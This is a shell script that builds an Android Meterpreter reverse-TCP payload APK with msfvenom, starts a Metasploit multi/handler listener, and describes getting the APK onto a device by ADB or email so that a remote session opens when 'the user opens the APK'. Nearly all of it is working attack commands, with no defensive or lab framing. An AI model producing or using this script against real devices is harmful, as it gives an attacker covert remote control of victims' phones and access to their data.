# Script to create a payload for Android using Meterpreter and msfvenom

# Step 1: Environment Setup
# Make sure you have Metasploit Framework installed on your system.
# This script assumes you are using Kali Linux or a compatible system.

# Update repositories and install Metasploit
sudo apt update
sudo apt install -y metasploit-framework

# Step 2: Generate the Payload
# Run msfvenom to create the Android payload with Meterpreter.

# Define your IP and port
LHOST=<your_ip>  # Replace <your_ip> with your IP address
LPORT=<port>  # Replace <port> with the desired port (e.g., 4444)

# Generate the APK payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o payload.apk

# Verify that the payload.apk file has been created
ls -l payload.apk

# Step 3: Set up the Listener in Metasploit
# Start Metasploit to configure the handler.

# Open Metasploit
msfconsole <<EOF
# Configure the exploit
use exploit/multi/handler

# Configure the payload
set payload android/meterpreter/reverse_tcp

# Set the LHOST and LPORT options
set LHOST $LHOST
set LPORT $LPORT

# Start the listener
exploit
EOF

# Step 4: Install the Payload on the Android Device
# Transfer the payload.apk file to the Android device using ADB, email, etc.
# Make sure the device has installations from unknown sources enabled.

# You can add the ADB command here if the device is connected:
# adb install payload.apk

# Step 5: Capture the Meterpreter Session
# Once the user opens the APK on the Android device, you should see an active Meterpreter session.

# Interact with the session using the session ID shown in Metasploit.
# For example, if the session ID is 1:
# sessions -i 1

# End of Script
